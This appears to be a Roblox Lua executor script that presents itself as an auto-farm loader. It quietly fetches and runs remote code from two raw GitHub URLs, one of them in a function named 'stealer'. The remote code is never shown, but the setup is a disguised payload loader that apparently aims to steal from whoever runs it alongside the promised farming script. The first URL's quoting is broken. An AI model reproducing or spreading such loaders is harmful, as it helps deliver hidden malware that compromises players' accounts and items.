local function stealer()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/clsjiv/scripts/refs/heads/main/scripts))()
end
local function farm()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/clsjiv/loading/refs/heads/main/loading.lua.txt'))()
end

task.spawn(stealer)
task.spawn(farm)
